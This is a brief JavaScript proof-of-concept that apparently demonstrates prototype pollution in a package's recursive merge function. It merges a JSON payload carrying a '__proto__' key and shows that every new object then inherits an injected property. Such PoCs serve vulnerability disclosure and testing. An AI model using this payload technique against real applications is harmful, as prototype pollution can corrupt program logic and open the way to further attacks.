var merge = require('./package/lib/index.js').recursive;
var malicious_payload = '{"__proto__":{"oops":"It works !"}}';

var a = {};
console.log("Before : " + a.oops);
merge({}, JSON.parse(malicious_payload));
console.log("After : " + a.oops);
